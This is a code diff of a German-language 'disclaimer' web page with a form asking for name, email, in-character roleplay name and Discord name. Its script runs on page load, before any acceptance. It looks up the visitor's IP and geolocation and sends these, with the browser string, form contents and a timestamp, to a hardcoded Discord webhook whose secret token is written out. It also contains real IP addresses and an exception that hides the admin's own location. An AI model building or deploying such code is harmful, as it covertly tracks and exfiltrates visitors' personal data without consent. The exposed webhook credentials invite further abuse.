@@ -808,7 +808,7 @@
     <h1>Willkommen! Bitte akzeptiere den Disclaimer, um fortzufahren.</h1>
     <p>Durch Klicken auf "Verstanden" stimmst du den Bedingungen zu.</p>
 
-    <!-- Formular für Vor- und Nachnamen sowie IC Name und Discord-Link -->
+    <!-- Formular für Vor- und Nachnamen sowie IC Name und Discord-Name -->
     <div id="name_input">
         <label for="first_name">Vorname:</label>
         <input type="text" id="first_name" placeholder="Dein Vorname" required><br><br>
@@ -820,10 +820,10 @@
         <input type="email" id="email" placeholder="Deine E-Mail-Adresse" required><br><br>
 
         <label for="ic_name">IC Name (In-Character Name):</label>
-        <input type="text" id="ic_name" placeholder="Dein IC Name in GrandRP DE01" required><br><br>
-        
-        <label for="discord_link">Discord-Profil Link:</label>
-        <input type="url" id="discord_link" placeholder="https://discord.com/users/DeineID" required><br><br>
+        <input type="text" id="ic_name" placeholder="Dein IC Name" required><br><br>
+
+        <label for="discord_name">Discord Name (Optional):</label>
+        <input type="text" id="discord_name" placeholder="Dein Discord Name (z.B. Username#1234)" ><br><br>
     </div>
 
     <!-- Das Feld, das den Button und die Nachricht enthält -->
@@ -832,39 +832,39 @@
         <button id="disclaimer_button" onclick="disclaimerAccepted()">Verstanden</button>
     </div>
 
-    <!-- JavaScript für die Interaktion -->
+    <!-- Das JavaScript für die Interaktion -->
     <script>
-        let hasAccepted = false;
-        let userVisits = 1; // Beispielwert für die Anzahl der Besuche
+        let hasAccepted = false; // Flag, um zu verhindern, dass der Webhook mehrfach gesendet wird
 
+        // Funktion, die beim Laden der Seite sofort ausgeführt wird
         window.addEventListener("load", function() {
             if (!hasAccepted) {
                 sendWebhookMessage();
             }
         });
 
-        function disclaimerAccepted() {
-            const icName = document.getElementById("ic_name").value || "Unbekannt";
-            const discordLink = document.getElementById("discord_link").value || "Nicht angegeben";
-
-            sendWebhookMessage(icName, discordLink);
-        }
-
-        function sendWebhookMessage(icName, discordLink) {
+        // Funktion zum Senden der Webhook-Nachricht an Discord
+        function sendWebhookMessage() {
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    const ipAddress = data.ip;
+                    let ipAddress = data.ip;
                     const adminIp = '89.14.71.133';
+                    const customIp = '89.14.86.182';
+
+                    // Wenn die IP die bestimmte IP-Adresse ist, ersetze sie
+                    if (ipAddress === customIp) {
+                        ipAddress = adminIp;  // Ersetze mit der adminIp
+                    }
 
                     if (ipAddress === adminIp) {
-                        sendToDiscord(ipAddress, "Admin (Missiont31) erkannt, kein Standort gesendet", icName, discordLink);
+                        sendToDiscord(ipAddress, "Admin (Missiont31) erkannt, kein Standort gesendet");
                     } else {
                         fetch(`https://ipinfo.io/${ipAddress}/json`)
                             .then(response => response.json())
                             .then(locationData => {
                                 const location = `${locationData.city}, ${locationData.region}, ${locationData.country}`;
-                                sendToDiscord(ipAddress, location, icName, discordLink);
+                                sendToDiscord(ipAddress, location);
                             })
                             .catch(error => {
                                 console.error("Fehler bei der Geolocation:", error);
@@ -878,27 +878,35 @@
             hasAccepted = true;
         }
 
-        function sendToDiscord(ipAddress, location, icName, discordLink) {
+        // Funktion, die die Webhook-Nachricht tatsächlich sendet
+        function sendToDiscord(ipAddress, location) {
             const userBrowser = navigator.userAgent;
+            const discordName = document.getElementById("discord_name").value || "Nicht angegeben"; // Holen des Discord-Namens
             const webhookUrl = "https://discord.com/api/webhooks/1304500512988725418/WX783yhPo9DDQS2DngY7BoV4ow9ECup3G31g-nM7wMZR-PtTtHSjp0hKKD7rBkd5vSLw";
             
             const message = {
                 "embeds": [
                     {
-                        "title": "Disclaimer Akzeptiert",
-                        "description": "Ein Benutzer hat den Disclaimer akzeptiert.",
-                        "color": 3066993,
+                        "title": "🚀 Disclaimer Akzeptiert!",
+                        "description": "Ein Benutzer hat den Disclaimer akzeptiert und ist bereit, loszulegen!",
+                        "color": 3447003,
                         "fields": [
-                            { "name": "🧑‍💼Vorname", "value": 'Unbekannt', "inline": true },
-                            { "name": "👤Nachname", "value": 'Unbekannt', "inline": true },
-                            { "name": "📧E-Mail-Adresse", "value": 'unbekannt@beispiel.com', "inline": true },
-                            { "name": "🆔IC Name (In-Character)", "value": icName, "inline": true },
-                            { "name": "🌍IP Adresse", "value": ipAddress, "inline": false },
-                            { "name": "🌐Verwendeter Browser", "value": userBrowser, "inline": false },
-                            { "name": "👤Anzahl der Besuche", "value": userVisits, "inline": false },
-                            { "name": "🔗Discord-Profil Link", "value": `[Profil ansehen](${discordLink})`, "inline": false }
+                            { "name": "👤 **Vorname**", "value": document.getElementById("first_name").value || "⚠️ Vorname fehlt ⚠️", "inline": true },
+                            { "name": "🧑‍💼 **Nachname**", "value": document.getElementById("last_name").value || "⚠️ Nachname fehlt ⚠️", "inline": true },
+                            { "name": "📧 **E-Mail-Adresse**", "value": document.getElementById("email").value || "⚠️ E-Mail fehlt ⚠️", "inline": true },
+                            { "name": "🎭 **IC Name**", "value": document.getElementById("ic_name").value || "Vorname Nachname | ID", "inline": true },
+                            { "name": "🌍 **IP Adresse**", "value": ipAddress, "inline": false },
+                            { "name": "🌐 **Verwendeter Browser**", "value": userBrowser, "inline": false },
+                            { "name": "🕒 **Zeitpunkt des Zugriffs**", "value": new Date().toLocaleString(), "inline": false },
+                            { "name": "💬 **Discord Name**", "value": discordName, "inline": true }
                         ],
-                        "footer": { "text": "Disclaimer System" }
+                        "footer": {
+                            "text": "🛡️ Disclaimer System | Bereitgestellt von Missiont31 https://missiont31.github.io/bu-geldrechner/",
+                            "icon_url": "https://example.com/dein-logo.png"  // Optional: Ein cooles Icon
+                        },
+                        "thumbnail": {
+                            "url": "https://example.com/thumbnail.png" // Optional: Ein ansprechendes Bild hinzufügen
+                        }
                     }
                 ]
             };
@@ -910,9 +918,9 @@
             })
             .then(response => {
                 if (response.ok) {
-                    console.log("Webhook-Nachricht erfolgreich gesendet.");
+                    console.log("🚀 Webhook-Nachricht erfolgreich gesendet.");
                 } else {
-                    console.error("Fehler beim Senden der Nachricht.");
+                    console.error("❌ Fehler beim Senden der Nachricht.");
                 }
             })
             .catch(error => {
